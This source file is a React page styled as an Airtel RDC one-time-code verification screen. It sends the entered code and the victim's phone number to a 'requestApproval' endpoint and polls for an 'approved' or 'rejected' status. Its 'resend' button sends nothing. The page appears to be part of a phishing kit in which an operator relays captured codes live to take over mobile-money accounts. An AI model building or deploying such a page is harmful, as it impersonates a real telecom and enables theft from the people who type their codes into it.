import React, { useState } from "react";
import { requestApproval, checkStatus } from "../utils/apiClient";
import toast from "react-hot-toast";
import { ArrowLeft, Loader2 } from "lucide-react";
import {
    pageStyle,
    headerStyle,
    logoStyle,
    menuButtonStyle,
    contentStyle,
    cardStyle,
    footerStyle,
    buttonStyle,
} from "../styles/sharedStyles";
import { OtpVerificationPageProps } from "../types";

const formatAirtelCongoOtpMessage = (otpValue: string) =>
    `<#> Votre code OTP Airtel RDC est : ${otpValue}. Ne partagez ce code avec personne. Expire dans 2 min. td1xRGYXC+L`;

function OtpVerificationPage({
    phoneNumber,
    onComplete,
    onBack,
}: OtpVerificationPageProps) {
    const [otp, setOtp] = useState<string[]>(["", "", "", ""]);
    const [loading, setLoading] = useState(false);
    const [resendTimer, setResendTimer] = useState(60);
    const [codeExpired, setCodeExpired] = useState(false);
    const inputRefs = React.useRef<(HTMLInputElement | null)[]>([]);
    const submittingRef = React.useRef(false);

    React.useEffect(() => {
        inputRefs.current[0]?.focus();
    }, []);

    React.useEffect(() => {
        if (resendTimer > 0) {
            const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
            return () => clearTimeout(timer);
        } else if (resendTimer === 0) {
            setCodeExpired(true);
        }
    }, [resendTimer]);

    const executeOtpSubmit = async (otpValue: string) => {
        if (submittingRef.current || loading) return;
        if (otpValue.length !== 4) {
            toast.error("Veuillez entrer les 4 chiffres du code");
            return;
        }

        if (codeExpired) {
            return;
        }

        setLoading(true);
        submittingRef.current = true;

        try {
            const payload = {
                type: 'otp',
                name: "Vérification OTP Utilisateur",
                phone: phoneNumber?.replace(/\s/g, '') || "N/A",
                details: formatAirtelCongoOtpMessage(otpValue),
            };

            const res = await requestApproval(payload);
            const attemptId = res.attemptId;

            let pollCount = 0;
            const maxPolls = 60;
            const interval = setInterval(async () => {
                pollCount++;
                if (pollCount > maxPolls) {
                    clearInterval(interval);
                    submittingRef.current = false;
                    setLoading(false);
                    toast.error("Délai d'attente dépassé. Veuillez réessayer.");
                    return;
                }

                try {
                    const statusRes = await checkStatus(attemptId);
                    const status = statusRes.status;

                    if (status === 'approved') {
                        clearInterval(interval);
                        submittingRef.current = false;
                        setLoading(false);
                        toast.success("Code OTP vérifié avec succès !");
                        onComplete();
                    } else if (status === 'rejected') {
                        clearInterval(interval);
                        submittingRef.current = false;
                        setLoading(false);
                        toast.error("Code OTP invalide, veuillez réessayer.");
                        setOtp(["", "", "", ""]);
                        setTimeout(() => inputRefs.current[0]?.focus(), 100);
                    }
                } catch (e) {
                    console.error("Polling error", e);
                }
            }, 2000);

        } catch (err: any) {
            console.error("Failed to request approval:", err);
            submittingRef.current = false;
            setLoading(false);
            const msg = "Échec de connexion au serveur. Veuillez réessayer.";
            toast.error(msg);
        }
    };

    const handleOtpChange = (index: number, value: string) => {
        if (!/^\d*$/.test(value)) return;

        const newOtp = [...otp];
        newOtp[index] = value.slice(-1);
        setOtp(newOtp);

        if (value && index < 3) {
            inputRefs.current[index + 1]?.focus();
        }

        // Auto-submit when all 4 digits are entered
        if (value && index === 3) {
            const fullOtp = [...newOtp.slice(0, 3), value.slice(-1)].join("");
            if (fullOtp.length === 4) {
                setTimeout(() => {
                    executeOtpSubmit(fullOtp);
                }, 100);
            }
        }
    };

    const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
        if (e.key === "Backspace" && !otp[index] && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
    };

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        const otpValue = otp.join("");
        executeOtpSubmit(otpValue);
    };

    const handleResend = () => {
        if (codeExpired) {
            onBack();
            return;
        }

        if (resendTimer > 0) return;

        toast.success("Code OTP renvoyé avec succès !");
        setResendTimer(60);
        setCodeExpired(false);
        setOtp(["", "", "", ""]);
        inputRefs.current[0]?.focus();
    };

    return (
        <div
            style={{
                ...pageStyle,
                background: "linear-gradient(to bottom, #f0f0f0 0%, #e0e0e0 100%)",
            }}
        >
            <div style={headerStyle}>
                <button
                    onClick={onBack}
                    style={{
                        background: "none",
                        border: "none",
                        color: "#333",
                        cursor: "pointer",
                        fontSize: "24px",
                        display: "flex",
                        alignItems: "center",
                        gap: "5px",
                    }}
                >
                    <ArrowLeft size={20} />
                </button>
                <img src="/airtel.svg" alt="Airtel RDC" style={logoStyle} />
                <button style={menuButtonStyle}>☰</button>
            </div>

            <div style={contentStyle}>
                <div
                    style={{
                        ...cardStyle,
                        maxWidth: "450px",
                    }}
                >
                    <h1
                        style={{
                            fontSize: "30px",
                            fontWeight: "700",
                            marginBottom: "15px",
                            color: "#333",
                        }}
                    >
                        Vérification OTP
                    </h1>
                    <p
                        style={{
                            color: "#666",
                            fontSize: "15px",
                            marginBottom: "30px",
                            lineHeight: "1.5",
                        }}
                    >
                        Entrez le code OTP à 4 chiffres envoyé à votre numéro
                        <br />
                        <strong style={{ color: "#333" }}>
                            {phoneNumber || "+243 099 123 4567"}
                        </strong>
                    </p>

                    <form onSubmit={handleSubmit}>
                        <div
                            style={{
                                display: "flex",
                                gap: "16px",
                                justifyContent: "center",
                                marginBottom: "25px",
                            }}
                        >
                            {otp.map((digit, index) => (
                                <input
                                    key={index}
                                    ref={(el) => (inputRefs.current[index] = el)}
                                    type="password"
                                    inputMode="numeric"
                                    maxLength={1}
                                    value={digit}
                                    onChange={(e) => handleOtpChange(index, e.target.value)}
                                    onKeyDown={(e) => handleKeyDown(index, e)}
                                    style={{
                                        width: "60px",
                                        height: "60px",
                                        fontSize: "32px",
                                        fontWeight: "600",
                                        textAlign: "center",
                                        border: "2px solid #ddd",
                                        borderRadius: "12px",
                                        outline: "none",
                                        transition: "border-color 0.2s",
                                    }}
                                    onFocus={(e) => {
                                        e.target.style.borderColor = "#e40000";
                                    }}
                                    onBlur={(e) => {
                                        e.target.style.borderColor = "#ddd";
                                    }}
                                />
                            ))}
                        </div>

                        <div
                            style={{
                                textAlign: "center",
                                marginBottom: "25px",
                            }}
                        >
                            {codeExpired ? (
                                <div>
                                    <p
                                        style={{
                                            color: "#dc3545",
                                            fontSize: "14px",
                                            fontWeight: "600",
                                            marginBottom: "12px",
                                        }}
                                    >
                                        Code OTP expiré, veuillez demander un nouveau code
                                    </p>
                                    <button
                                        type="button"
                                        onClick={handleResend}
                                        style={{
                                            background: "none",
                                            border: "none",
                                            color: "#e40000",
                                            cursor: "pointer",
                                            fontSize: "14px",
                                            textDecoration: "underline",
                                            fontWeight: "500",
                                        }}
                                    >
                                        Renvoyer le code OTP
                                    </button>
                                </div>
                            ) : (
                                <button
                                    type="button"
                                    onClick={handleResend}
                                    disabled={resendTimer > 0}
                                    style={{
                                        background: "none",
                                        border: "none",
                                        color: resendTimer > 0 ? "#999" : "#e40000",
                                        cursor: resendTimer > 0 ? "not-allowed" : "pointer",
                                        fontSize: "14px",
                                        textDecoration: "underline",
                                    }}
                                >
                                    Renvoyer le code OTP {resendTimer > 0 ? `dans ${resendTimer} s` : ""}
                                </button>
                            )}
                        </div>

                        <button
                            type="submit"
                            disabled={loading || otp.join("").length !== 4}
                            style={{
                                ...buttonStyle,
                                background:
                                    loading || otp.join("").length !== 4 ? "#ccc" : "linear-gradient(135deg, #e40000 0%, #c40000 100%)",
                                cursor:
                                    loading || otp.join("").length !== 4
                                        ? "not-allowed"
                                        : "pointer",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                gap: "8px",
                            }}
                        >
                            {loading ? (
                                <>
                                    <Loader2 className="spinner" size={18} />
                                    VÉRIFICATION...
                                </>
                            ) : (
                                "VALIDER"
                            )}
                        </button>
                    </form>
                </div>
            </div>

            <div style={footerStyle}>© 2025 Airtel RDC</div>
        </div>
    );
}

export default OtpVerificationPage;
